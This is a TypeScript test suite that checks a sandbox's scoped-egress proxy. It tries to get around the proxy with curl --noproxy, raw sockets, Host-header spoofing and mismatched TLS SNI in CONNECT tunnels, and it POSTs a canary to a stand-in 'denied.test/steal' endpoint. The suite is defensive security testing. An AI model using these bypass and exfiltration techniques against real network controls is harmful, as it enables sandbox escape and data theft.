/**
 * Scoped-egress attack matrix (alpha.6 §32–§35, §55–§59, §77, §90).
 *
 * This is the suite the alpha.6 release claim rests on. Every assertion in it is
 * built to §3.2's rule: a test that says "the attack did not succeed" is not
 * evidence, because it passes just as well when the attack path was never live.
 * So each security property here is paired with
 *
 *     a positive control    the same path, allowed, actually works
 *     a contrast            the same target, unrestricted, is reachable
 *     a mechanism assertion the proxy's own reason code, not just exit != 0
 *
 * and the mechanism assertion is what makes the difference between "curl failed"
 * and "curl failed because the proxy classified the destination as not in the
 * approved host set".
 */

import { strict as assert } from 'node:assert';
import { after, before, describe, it } from 'node:test';

import { canonicalize, type CanonicalPath } from '../../src/util/paths.ts';
import { Redactor } from '../../src/security/redactor.ts';
import { createLogger } from '../../src/util/logger.ts';
import { ContainerExecutionBackend, defaultContainerConfig } from '../../src/execution/container.ts';
import type { CapabilityProfile } from '../../src/execution/backend.ts';
import type { ContainerPlan } from '../../src/execution/container-plan.ts';
import type { EgressAuditRecord } from '../../src/security/egress-proxy/proxy.ts';
import type { EgressSidecarTiming } from '../../src/execution/egress-sidecar.ts';
import { containerSkip, TEST_IMAGE } from './container-harness.ts';
import {
  ALLOWED_MARKER,
  DENIED_MARKER,
  EGRESS_CANARY,
  createEgressTopology,
  createEgressWorkspace,
  targetReceivedLog,
  type EgressTopology,
} from './egress-harness.ts';

const skip = await containerSkip();

describe('scoped egress enforcement', { concurrency: 1, ...skip }, () => {
  let topology: EgressTopology;
  let backend: ContainerExecutionBackend;
  let root: CanonicalPath;
  let cleanupWorkspace: () => Promise<void>;
  const plans: ContainerPlan[] = [];
  let audits: EgressAuditRecord[] = [];
  const timings: EgressSidecarTiming[] = [];

  before(async () => {
    topology = await createEgressTopology();
    const workspace = await createEgressWorkspace();
    cleanupWorkspace = workspace.cleanup;
    root = (await canonicalize(workspace.root, { cwd: workspace.root })).path;

    backend = await ContainerExecutionBackend.create({
      workspaceRoot: root,
      redactor: new Redactor(),
      config: { ...defaultContainerConfig(), image: TEST_IMAGE },
      logger: createLogger({ level: 'silent', scope: 'test:egress' }),
      // §56: the controlled targets are on private addresses, so the suite opts
      // in explicitly. The default — and the production path — denies them, and
      // one of the tests below proves that by turning this off.
      allowPrivateEgressAddresses: true,
      egressTestHostAliases: topology.hostAliases,
      onPlan: (plan) => plans.push(plan),
      onEgressAudit: (records, timing) => {
        audits = [...records];
        timings.push(timing);
      },
    });
  });

  after(async () => {
    await backend?.close();
    await topology?.cleanup();
    await cleanupWorkspace?.();
  });

  const profile = (over: Partial<CapabilityProfile> = {}): CapabilityProfile => ({
    readRoots: [root],
    writeRoots: [],
    allowExec: true,
    network: false,
    envAllow: [],
    secretInjections: [],
    timeoutMs: 120_000,
    maxOutputBytes: 4 * 1024 * 1024,
    ...over,
  });

  const run = async (
    script: string,
    over: Partial<CapabilityProfile> = {},
  ): Promise<{ stdout: string; stderr: string; exitCode: number | null }> => {
    audits = [];
    const executor = await backend.enforce(profile(over));
    try {
      const result = await executor.exec({
        argv: ['sh', '-c', script],
        cwd: root,
        timeoutMs: 120_000,
      });
      return { stdout: result.stdout, stderr: result.stderr, exitCode: result.exitCode };
    } finally {
      executor.dispose();
    }
  };

  const scoped = (hosts: string[]): Partial<CapabilityProfile> => ({ network: { hosts } });

  /** The proxy's own verdicts for the execution that just ran. */
  const reasons = (): string[] => audits.map((r) => r.reason);

  // --- the plan and the topology it produced -------------------------------

  it('plans a private network with the proxy as the only exit (§12, §13)', async () => {
    await run('true', scoped(['allowed.test']));
    const plan = plans.at(-1)!;
    assert.equal(plan.network.kind, 'scoped');
    const network = plan.network as Extract<ContainerPlan['network'], { kind: 'scoped' }>;
    assert.match(network.dockerNetwork, /^mycoder-egress-/);
    assert.deepEqual(network.allowedHosts, ['allowed.test']);
    assert.deepEqual(network.dns, ['127.0.0.1']);
    assert.equal(plan.env.HTTP_PROXY, `http://${network.proxyAddress}:${network.proxyPort}`);
    // The plan must never name a routable network under scoped egress.
    assert.notEqual(network.dockerNetwork, 'bridge');
  });

  it('removes the network and the proxy when the execution finishes (§46)', async () => {
    await run('true', scoped(['allowed.test']));
    const network = (plans.at(-1)!.network as Extract<ContainerPlan['network'], { kind: 'scoped' }>)
      .dockerNetwork;
    const { runDocker } = await import('../../src/execution/docker-cli.ts');
    const nets = await runDocker('docker', ['network', 'ls', '-q', '--filter', `name=^${network}$`], {
      timeoutMs: 15_000,
    });
    assert.equal(nets.stdout.trim(), '', 'the private network outlived its execution');
    const procs = await runDocker('docker', ['ps', '-a', '-q', '--filter', 'label=mycoder.egress=1'], {
      timeoutMs: 15_000,
    });
    assert.equal(procs.stdout.trim(), '', 'an egress proxy outlived its execution');
  });

  // --- §58 row 1: allowlist ------------------------------------------------

  it('reaches the approved host — the positive control', async () => {
    const result = await run('curl -sS --max-time 20 http://allowed.test/', scoped(['allowed.test']));
    assert.equal(result.exitCode, 0, `expected success, got: ${result.stderr}`);
    assert.match(result.stdout, new RegExp(ALLOWED_MARKER));
    assert.ok(audits.some((r) => r.decision === 'allowed' && r.host === 'allowed.test'));
  });

  it('refuses a host that was not approved, and says which check refused it', async () => {
    // Note the shape of this assertion. `curl` without `-f` exits 0 on a 403, so
    // an exit-code test here would have been the vacuous kind §59 warns about —
    // it would pass whether the proxy denied the request or served it. What is
    // asserted instead is the status, the reason the proxy put in the body, and
    // the absence of the denied target's marker.
    const result = await run(
      'curl -sS --max-time 20 -w "\\nstatus=%{http_code}\\n" http://denied.test/',
      scoped(['allowed.test']),
    );
    assert.match(result.stdout, /status=403/);
    assert.match(result.stdout, /host-not-allowed/);
    assert.ok(!result.stdout.includes(DENIED_MARKER), 'the denied target answered');
    // §59: the mechanism, from the proxy's own audit trail rather than its body.
    assert.ok(
      reasons().includes('host-not-allowed'),
      `expected host-not-allowed, saw ${reasons().join(',')}`,
    );
  });

  it('CONTRAST: the same denied target is reachable under unrestricted mode', async () => {
    // This is what proves the target and the sink were live — that the test
    // above measured a policy decision rather than a broken fixture.
    const result = await run(`curl -sS --max-time 20 http://${topology.denied.address}/`, {
      network: { unrestricted: true },
    });
    assert.equal(
      result.exitCode,
      0,
      `the contrast configuration could not reach the target: ${result.stderr}`,
    );
    assert.match(result.stdout, new RegExp(DENIED_MARKER));
    assert.equal(plans.at(-1)!.network.kind, 'unrestricted');
  });

  it('denies every near-miss of the approved hostname (§21)', async () => {
    const result = await run(
      'curl -sS --max-time 15 http://sub.allowed.test/ ; curl -sS --max-time 15 http://allowed.test.evil/ ; true',
      scoped(['allowed.test']),
    );
    assert.ok(!result.stdout.includes(ALLOWED_MARKER));
    assert.ok(
      reasons().every((r) => r !== 'allowed'),
      'a near-miss hostname was allowed',
    );
  });

  it('carries two approved hosts in one execution (§6)', async () => {
    const result = await run(
      'curl -sS --max-time 20 http://allowed.test/ && curl -sS --max-time 20 http://denied.test/',
      scoped(['allowed.test', 'denied.test']),
    );
    assert.equal(result.exitCode, 0);
    assert.match(result.stdout, new RegExp(ALLOWED_MARKER));
    assert.match(result.stdout, new RegExp(DENIED_MARKER));
  });

  // --- §58 row 2: direct bypass --------------------------------------------

  it('cannot bypass the proxy with curl --noproxy (§32)', async () => {
    const result = await run(
      `curl -sS --noproxy '*' --max-time 15 http://${topology.denied.address}/ ; echo "exit=$?"`,
      scoped(['allowed.test']),
    );
    assert.ok(!result.stdout.includes(DENIED_MARKER), 'a --noproxy request reached the denied target');
    assert.match(result.stdout, /exit=[1-9]/);
    // Nothing reached the proxy at all: the topology refused before policy could.
    assert.ok(!reasons().includes('allowed'));
  });

  it('cannot bypass the proxy with a raw Node socket (§32)', async () => {
    const script =
      `node -e "const net=require('node:net');const s=net.connect({host:'${topology.denied.address}',port:80});` +
      `s.setTimeout(8000);s.on('connect',()=>{console.log('RAW-CONNECTED');process.exit(0)});` +
      `s.on('error',e=>{console.log('RAW-BLOCKED:'+e.code);process.exit(0)});` +
      `s.on('timeout',()=>{console.log('RAW-TIMEOUT');process.exit(0)})"`;
    const result = await run(script, scoped(['allowed.test']));
    assert.ok(!result.stdout.includes('RAW-CONNECTED'), 'a raw socket reached the denied target');
    assert.match(result.stdout, /RAW-BLOCKED|RAW-TIMEOUT/);
  });

  it('cannot bypass the proxy with a raw Python socket (§32)', async () => {
    // Written to a file rather than passed as `python3 -c`: a Python one-liner
    // cannot carry a try/except, and every escaping trick that fits one into a
    // shell string is a way for the test to fail for a reason that has nothing
    // to do with the network. The image's `/tmp` is a writable tmpfs.
    const script = [
      "cat > /tmp/probe.py <<'PY'",
      'import socket',
      's = socket.socket()',
      's.settimeout(8)',
      'try:',
      `    s.connect(('${topology.denied.address}', 80))`,
      "    print('PY-CONNECTED')",
      'except Exception:',
      "    print('PY-BLOCKED')",
      'PY',
      'python3 /tmp/probe.py',
    ].join('\n');
    const result = await run(script, scoped(['allowed.test']));
    assert.ok(!result.stdout.includes('PY-CONNECTED'), 'a python socket reached the denied target');
    assert.match(result.stdout, /PY-BLOCKED/);
  });

  it('CONTRAST: the same raw socket connects under unrestricted mode', async () => {
    // Without this the bypass tests above would pass on a machine where the
    // target container was simply down.
    const script =
      `node -e "const net=require('node:net');const s=net.connect({host:'${topology.denied.address}',port:80});` +
      `s.setTimeout(8000);s.on('connect',()=>{console.log('RAW-CONNECTED');process.exit(0)});` +
      `s.on('error',e=>{console.log('RAW-BLOCKED:'+e.code);process.exit(0)});` +
      `s.on('timeout',()=>{console.log('RAW-TIMEOUT');process.exit(0)})"`;
    const result = await run(script, { network: { unrestricted: true } });
    assert.match(result.stdout, /RAW-CONNECTED/, 'the bypass control could not reach the target');
  });

  it('has no external DNS inside the workload (§15)', async () => {
    const result = await run(
      'getent hosts registry.npmjs.org >/dev/null && echo DNS-RESOLVED || echo DNS-BLOCKED',
      scoped(['allowed.test']),
    );
    assert.match(result.stdout, /DNS-BLOCKED/);
  });

  it('unsetting the proxy variables changes nothing (§11)', async () => {
    const result = await run(
      `unset HTTP_PROXY HTTPS_PROXY http_proxy https_proxy; ` +
        `curl -sS --max-time 15 http://${topology.denied.address}/ ; echo "exit=$?"`,
      scoped(['allowed.test']),
    );
    assert.ok(!result.stdout.includes(DENIED_MARKER));
    assert.match(result.stdout, /exit=[1-9]/);
  });

  // --- §58 row 3: HTTP authority -------------------------------------------

  it('refuses a Host header that disagrees with the request target (§34)', async () => {
    const result = await run(
      'curl -sS --max-time 15 -H "Host: denied.test" http://allowed.test/ ; true',
      scoped(['allowed.test']),
    );
    assert.ok(!result.stdout.includes(ALLOWED_MARKER));
    assert.ok(!result.stdout.includes(DENIED_MARKER));
    assert.ok(
      reasons().includes('authority-mismatch'),
      `expected authority-mismatch, saw ${reasons().join(',')}`,
    );
  });

  // --- §58 row 4: HTTPS identity -------------------------------------------

  it('completes an approved HTTPS request through the CONNECT tunnel', async () => {
    // The positive control for the SNI tests. `-k` because the fixture uses a
    // self-signed certificate; the proxy never sees or checks it, which is the
    // point — no TLS termination, no CA.
    const result = await run('curl -sS -k --max-time 20 https://allowed.test/', scoped(['allowed.test']));
    assert.equal(result.exitCode, 0, `expected an approved HTTPS request to succeed: ${result.stderr}`);
    assert.match(result.stdout, new RegExp(ALLOWED_MARKER));
    assert.ok(audits.some((r) => r.protocol === 'https' && r.decision === 'allowed'));
  });

  /**
   * The §28 attack, built by hand.
   *
   * The first version of this test drove `curl`, and it passed — for the wrong
   * reason. `curl` derives the CONNECT authority from the URL, so asking it for
   * `https://denied.test` sends `CONNECT denied.test:443`, which the *host*
   * check refuses before the ClientHello is ever read. The test was green and
   * the SNI enforcement was untested, which is precisely the vacuous PASS §59
   * calls "a failure for the wrong reason".
   *
   * So the tunnel is opened directly: `CONNECT allowed.test:443` — an authority
   * the policy approves — and then a TLS handshake for a *different* server
   * name over that authorised tunnel. The fixture's certificate covers both
   * names, so nothing but the proxy can tell them apart.
   */
  const sniAttack = (servername: string, label: string): string =>
    [
      "cat > /tmp/sni.js <<'JS'",
      "const net = require('node:net');",
      "const tls = require('node:tls');",
      'const u = new URL(process.env.HTTP_PROXY);',
      'const s = net.connect({ host: u.hostname, port: Number(u.port) });',
      's.setTimeout(15000);',
      "s.on('timeout', () => { console.log('PROXY-TIMEOUT'); process.exit(0); });",
      "s.on('error', () => { console.log('PROXY-ERROR'); process.exit(0); });",
      "s.on('connect', () => s.write('CONNECT allowed.test:443 HTTP/1.1\\r\\nHost: allowed.test:443\\r\\n\\r\\n'));",
      "let buf = '';",
      'const onData = (d) => {',
      '  buf += d;',
      "  if (!buf.includes('\\r\\n\\r\\n')) return;",
      "  s.removeListener('data', onData);",
      "  if (!buf.startsWith('HTTP/1.1 200')) { console.log('CONNECT-REFUSED'); process.exit(0); }",
      `  const t = tls.connect({ socket: s, servername: '${servername}', rejectUnauthorized: false });`,
      "  t.on('secureConnect', () => { console.log('TLS-ESTABLISHED'); process.exit(0); });",
      "  t.on('error', () => { console.log('TLS-BLOCKED'); process.exit(0); });",
      '};',
      "s.on('data', onData);",
      'JS',
      `echo "case=${label}"`,
      'node /tmp/sni.js',
    ].join('\n');

  it('refuses a CONNECT tunnel whose TLS SNI names another host (§28)', async () => {
    const result = await run(sniAttack('denied.test', 'mismatch'), scoped(['allowed.test']));
    assert.ok(!result.stdout.includes('TLS-ESTABLISHED'), 'a mismatched SNI completed a handshake');
    assert.match(result.stdout, /TLS-BLOCKED|PROXY-TIMEOUT/);
    // The mechanism. This is the assertion the curl version could not make.
    assert.ok(
      reasons().includes('sni-mismatch'),
      `expected sni-mismatch from the proxy, saw ${reasons().join(',')}`,
    );
  });

  it('CONTRAST: the same tunnel with a matching SNI completes (§28 positive control)', async () => {
    // Proves the tunnel, the certificate and the fixture were all live, so the
    // denial above measured the SNI check and not a broken handshake.
    const result = await run(sniAttack('allowed.test', 'match'), scoped(['allowed.test']));
    assert.match(result.stdout, /TLS-ESTABLISHED/, `the positive control failed: ${result.stdout}`);
    assert.ok(!reasons().includes('sni-mismatch'));
  });

  it('refuses a CONNECT tunnel carrying no TLS at all (§29)', async () => {
    const script =
      `node -e "const net=require('node:net');const u=new URL(process.env.HTTP_PROXY);` +
      `const s=net.connect({host:u.hostname,port:Number(u.port)});s.setTimeout(10000);` +
      `s.on('connect',()=>s.write('CONNECT allowed.test:443 HTTP/1.1\\r\\nHost: allowed.test:443\\r\\n\\r\\n'));` +
      `let seen='';s.on('data',d=>{seen+=d;if(seen.includes('200')&&!s.sent){s.sent=1;s.write('GET / HTTP/1.1\\r\\nHost: allowed.test\\r\\n\\r\\n')}});` +
      `s.on('close',()=>{console.log('TUNNEL-OUTPUT:'+JSON.stringify(seen.slice(0,200)));process.exit(0)});` +
      `s.on('error',()=>{console.log('TUNNEL-ERROR');process.exit(0)});` +
      `s.on('timeout',()=>{console.log('TUNNEL-TIMEOUT');process.exit(0)})"`;
    const result = await run(script, scoped(['allowed.test']));
    assert.ok(!result.stdout.includes(ALLOWED_MARKER), 'plaintext HTTP crossed a CONNECT tunnel');
    assert.ok(
      reasons().includes('sni-malformed') || reasons().includes('sni-missing'),
      `expected the tunnel to fail the identity check, saw ${reasons().join(',')}`,
    );
  });

  it('denies CONNECT to an approved host on a port outside the scope (§33)', async () => {
    const script =
      `node -e "const net=require('node:net');const u=new URL(process.env.HTTP_PROXY);` +
      `const s=net.connect({host:u.hostname,port:Number(u.port)});s.setTimeout(10000);` +
      `s.on('connect',()=>s.write('CONNECT allowed.test:22 HTTP/1.1\\r\\nHost: allowed.test:22\\r\\n\\r\\n'));` +
      `let seen='';s.on('data',d=>{seen+=d});` +
      `s.on('close',()=>{console.log('RESPONSE:'+seen.split('\\r\\n')[0]);process.exit(0)});` +
      `s.on('error',()=>{console.log('ERR');process.exit(0)});s.on('timeout',()=>{console.log('TIMEOUT');process.exit(0)})"`;
    const result = await run(script, scoped(['allowed.test']));
    assert.match(result.stdout, /RESPONSE:HTTP\/1\.1 403/);
    assert.ok(reasons().includes('port-not-allowed'), `saw ${reasons().join(',')}`);
  });

  // --- §58 row 5: address policy -------------------------------------------

  it('denies an approved host that resolves into private space when §23 is on', async () => {
    // A second backend with the production default: private addresses denied.
    // The *same* topology, the *same* approved host — only the address policy
    // differs, which is what makes this a controlled comparison rather than two
    // unrelated runs.
    const strict = await ContainerExecutionBackend.create({
      workspaceRoot: root,
      redactor: new Redactor(),
      config: { ...defaultContainerConfig(), image: TEST_IMAGE },
      logger: createLogger({ level: 'silent', scope: 'test:egress-strict' }),
      egressTestHostAliases: topology.hostAliases,
      onEgressAudit: (records) => {
        audits = [...records];
      },
    });
    try {
      audits = [];
      const executor = await strict.enforce(profile(scoped(['allowed.test'])));
      let stdout = '';
      try {
        const result = await executor.exec({
          argv: ['sh', '-c', 'curl -sS --max-time 15 http://allowed.test/ ; true'],
          cwd: root,
          timeoutMs: 60_000,
        });
        stdout = result.stdout;
      } finally {
        executor.dispose();
      }
      await new Promise((resolve) => setTimeout(resolve, 200));
      assert.ok(!stdout.includes(ALLOWED_MARKER), 'a private address was reachable under the default policy');
      assert.ok(
        audits.some((r) => r.reason === 'address-not-global'),
        `expected address-not-global, saw ${audits.map((r) => r.reason).join(',')}`,
      );
      assert.ok(audits.some((r) => r.addressScope === 'private'));
    } finally {
      await strict.close();
    }
  });

  // --- §35 redirects --------------------------------------------------------

  it('does not let a redirect widen the approved host set (§35)', async () => {
    // curl is told to follow redirects; the second hop is a host that was never
    // approved, so it fails there rather than at the first request.
    const result = await run(
      'curl -sSL --max-time 20 http://allowed.test/ -w "\\nfinal=%{http_code}\\n" ; ' +
        'curl -sS --max-time 15 http://denied.test/ ; true',
      scoped(['allowed.test']),
    );
    assert.match(result.stdout, new RegExp(ALLOWED_MARKER));
    assert.ok(!result.stdout.includes(DENIED_MARKER));
    assert.ok(reasons().includes('host-not-allowed'));
  });

  // --- §69 exfiltration -----------------------------------------------------

  it('refuses to carry an unknown canary to an unapproved destination (§69)', async () => {
    const result = await run(
      `curl -sS --max-time 15 -X POST --data "canary=${EGRESS_CANARY}" http://denied.test/steal ; true`,
      scoped(['allowed.test']),
    );
    assert.ok(!result.stdout.includes(DENIED_MARKER));
    assert.ok(reasons().includes('host-not-allowed'));

    // The strongest form of the assertion: ask the target what it received.
    // The canary is unknown to SecretBroker and unrecognisable to the redactor,
    // so nothing but destination enforcement stood between it and the sink.
    const received = await targetReceivedLog('docker', topology.denied);
    assert.ok(!received.includes(EGRESS_CANARY), 'the canary reached the denied target');
  });

  it('CONTRAST: the same canary does reach an approved destination', async () => {
    // §42 in executable form. Scoped egress guarantees *where* bytes go, and
    // explicitly does not claim that an approved host cannot receive a secret.
    // Asserting the limit keeps the release note honest.
    await run(
      `curl -sS --max-time 15 -X POST --data "canary=${EGRESS_CANARY}" http://allowed.test/expected ; true`,
      scoped(['allowed.test']),
    );
    const received = await targetReceivedLog('docker', topology.allowed);
    assert.ok(
      received.includes(EGRESS_CANARY),
      'the approved-destination control did not land; the denial test above proves less than it should',
    );
  });

  // --- §39 fail closed ------------------------------------------------------

  it('fails closed rather than falling back when the grant is unenforceable (§39)', async () => {
    // `hosts: []` is the ambiguous grant §9 refuses. The execution must fail —
    // not run with no network, and above all not run with bridge networking.
    const executor = await backend.enforce(profile({ network: { hosts: [] } }));
    try {
      await assert.rejects(
        () => executor.exec({ argv: ['sh', '-c', 'true'], cwd: root, timeoutMs: 30_000 }),
        (error: Error & { code?: string }) => {
          assert.match(error.message, /not enforceable|not a valid network grant/);
          return true;
        },
      );
    } finally {
      executor.dispose();
    }
  });

  // --- §65 performance ------------------------------------------------------

  it('reports the topology setup cost (§65)', async () => {
    assert.ok(timings.length > 0, 'no setup timings were captured');
    const totals = timings.map((t) => t.totalSetupMs).sort((a, b) => a - b);
    const median = totals[Math.floor(totals.length / 2)]!;
    // Not a threshold assertion — §65 asks for a measurement, and a latency
    // budget in a test is a flake generator. The bound is a sanity check that
    // the number is real.
    assert.ok(median > 0 && median < 120_000, `implausible setup time: ${median}ms`);
    process.stdout.write(
      `\n  scoped-egress setup: n=${totals.length} median=${median}ms range=${totals[0]}–${totals.at(-1)}ms\n`,
    );
  });
});
